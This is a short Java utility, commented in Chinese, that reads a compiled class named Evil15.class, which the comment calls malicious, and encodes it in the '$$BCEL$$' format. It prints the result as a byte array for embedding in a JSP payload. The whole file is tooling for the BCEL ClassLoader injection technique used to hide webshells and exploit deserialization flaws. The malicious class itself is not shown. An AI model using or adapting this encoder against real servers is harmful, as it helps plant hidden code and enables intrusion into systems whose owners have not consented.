/*
 * [业务问题]: 生成 BCEL 编码载荷的辅助工具。
 * [实现逻辑]: 读取编译后的恶意类 Evil15.class，并将其转换成 BCEL 编码格式的字节数组输出，用于在 JSP 载荷中直接引用。
 */
import com.sun.org.apache.bcel.internal.classfile.Utility;
import java.io.IOException;
import java.io.InputStream;

public class EvilMake {

    public static void main(String[] args) throws IOException {
        InputStream inputStream = EvilMake.class.getClassLoader().getResourceAsStream("Evil15.class");
        byte[] bytes = new byte[inputStream.available()];
        inputStream.read(bytes);
        String code = "$$BCEL$$" + Utility.encode(bytes, true);
        bytes = code.getBytes();
        for (int i = 0; i < bytes.length; i++) {
            System.out.print(bytes[i]);
            if (i != bytes.length - 1)
                System.out.print(",");
        }
    }
}